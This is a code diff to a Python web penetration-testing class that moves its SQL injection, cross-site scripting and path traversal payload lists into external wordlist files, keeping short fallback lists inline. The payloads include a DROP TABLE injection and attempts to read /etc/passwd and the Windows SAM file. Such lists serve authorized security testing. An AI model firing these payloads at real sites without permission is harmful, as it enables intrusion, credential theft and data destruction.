@@ -57,46 +57,57 @@ class InteractivePentester:
             'findings': []
         }
 
-        # Test payloads
-        self.sql_payloads = [
-            "' OR '1'='1",
-            "' OR '1'='1' --",
-            "\" OR \"1\"=\"1",
-            "' OR 1=1--",
-            "admin' --",
-            "' UNION SELECT NULL--",
-            "1' AND '1'='1",
-            "1' AND '1'='2",
-            "'; DROP TABLE users--",
-            "' OR 'x'='x",
-            "1' OR '1' = '1",
-        ]
-
-        self.xss_payloads = [
-            "<script>alert('XSS')</script>",
-            "<img src=x onerror=alert('XSS')>",
-            "<svg onload=alert('XSS')>",
-            "javascript:alert('XSS')",
-            "<iframe src='javascript:alert(1)'>",
-            "<body onload=alert('XSS')>",
-            "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
-            "<img src='x' onerror='alert(1)'>",
-            "<svg/onload=alert('XSS')>",
-            "'-alert(1)-'",
-        ]
-
-        self.lfi_payloads = [
-            "../../../etc/passwd",
-            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
-            "....//....//....//etc/passwd",
-            "..%2F..%2F..%2Fetc%2Fpasswd",
-            "/etc/passwd",
-            "C:\\windows\\system32\\config\\sam",
-        ]
+        # Test payloads - Load from wordlists
+        self.wordlist_dir = self.options.get('wordlist_dir', 'wordlists')
+        self.sql_payloads = self.load_wordlist('sqli.txt')
+        self.xss_payloads = self.load_wordlist('xss.txt')
+        self.lfi_payloads = self.load_wordlist('lfi.txt')
 
         # Keyboard state
         self.ctrl_pressed = False
         self.testing_in_progress = False
+
+    def load_wordlist(self, filename):
+        """Load wordlist from file"""
+        import os
+
+        # Try multiple paths
+        possible_paths = [
+            os.path.join(self.wordlist_dir, filename),
+            os.path.join('..', '..', '..', 'wordlists', filename),
+            os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', '..', '..', 'wordlists', filename)
+        ]
+
+        for filepath in possible_paths:
+            try:
+                if os.path.exists(filepath):
+                    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
+                        payloads = [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]
+                    print(f"[+] Loaded {len(payloads)} payloads from {filename}")
+                    return payloads
+            except Exception as e:
+                continue
+
+        # Fallback to default payloads
+        print(f"[!] Could not load {filename}, using default payloads")
+
+        if 'sqli' in filename:
+            return [
+                "' OR '1'='1", "' OR '1'='1' --", "\" OR \"1\"=\"1",
+                "' OR 1=1--", "admin' --", "' UNION SELECT NULL--"
+            ]
+        elif 'xss' in filename:
+            return [
+                "<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>",
+                "<svg onload=alert('XSS')>", "javascript:alert('XSS')"
+            ]
+        elif 'lfi' in filename:
+            return [
+                "../../../etc/passwd", "..\\..\\..\\windows\\win.ini",
+                "....//....//....//etc/passwd"
+            ]
+
+        return []
 
     def init_driver(self):
         """Initialize Selenium WebDriver"""
